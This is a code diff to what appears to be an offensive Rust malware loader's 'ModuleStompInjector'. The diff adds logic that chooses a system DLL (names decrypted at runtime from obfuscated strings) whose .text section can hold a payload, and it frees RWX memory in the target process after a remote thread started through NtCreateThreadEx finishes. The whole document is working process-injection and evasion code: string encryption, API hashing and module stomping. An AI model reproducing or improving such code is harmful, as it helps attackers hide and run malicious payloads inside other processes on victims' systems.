@@ -72,7 +72,32 @@ impl Injector for ModuleStompInjector {
             let c2 = String::from_utf8_lossy(&string_crypt::enc_str!("scrobj.dll")).trim_end_matches('\0').to_string();
             let c3 = String::from_utf8_lossy(&string_crypt::enc_str!("amstream.dll")).trim_end_matches('\0').to_string();
             let candidates: Vec<&str> = vec![c0.as_str(), c1.as_str(), c2.as_str(), c3.as_str()];
-            let target_dll: &str = candidates[0];
+            // Iterate candidates (2.7): pick the first one whose .text section fits the payload
+            let target_dll: &str = candidates.iter().copied()
+                .find(|dll| {
+                    // Check DLL size by looking for it in the local process first (fast path)
+                    let dll_null = format!("{}\0", dll.to_ascii_lowercase());
+                    let hash = pe_resolve::hash_str(dll_null.as_bytes());
+                    if let Some(base) = pe_resolve::get_module_handle_by_hash(hash) {
+                        // Quick size check: read NT headers to find .text size
+                        unsafe {
+                            let dos = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
+                            if (*dos).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE { return false; }
+                            let nt = (base + (*dos).e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
+                            let ns = (*nt).FileHeader.NumberOfSections as usize;
+                            let sec_base = nt as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>();
+                            for i in 0..ns {
+                                let sec = (sec_base + i * std::mem::size_of::<winapi::um::winnt::IMAGE_SECTION_HEADER>())
+                                    as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
+                                if &(*sec).Name[..5] == b".text" {
+                                    return *(*sec).Misc.VirtualSize() as usize >= payload.len();
+                                }
+                            }
+                        }
+                    }
+                    true // if not loaded yet, optimistically try it
+                })
+                .unwrap_or(candidates[0]);
             let wide: Vec<u16> = target_dll.encode_utf16().chain(std::iter::once(0)).collect();
             let wide_bytes = wide.len() * 2;
 
@@ -178,6 +203,12 @@ impl Injector for ModuleStompInjector {
             if status >= 0 && !h_thread.is_null() {
                 winapi::um::synchapi::WaitForSingleObject(h_thread, winapi::um::winbase::INFINITE);
                 CloseHandle(h_thread);
+                // Free the RWX stub region once the thread has finished (2.6)
+                winapi::um::memoryapi::VirtualFreeEx(h_proc, stub_region, 0, winapi::um::winnt::MEM_RELEASE);
+                // Free the unused us_region allocation as well (2.6)
+                if !us_region.is_null() {
+                    winapi::um::memoryapi::VirtualFreeEx(h_proc, us_region, 0, winapi::um::winnt::MEM_RELEASE);
+                }
             } else {
                 CloseHandle(h_proc);
                 return Err(anyhow!("NtCreateThreadEx for LdrLoadDll stub failed: {:x}", status));
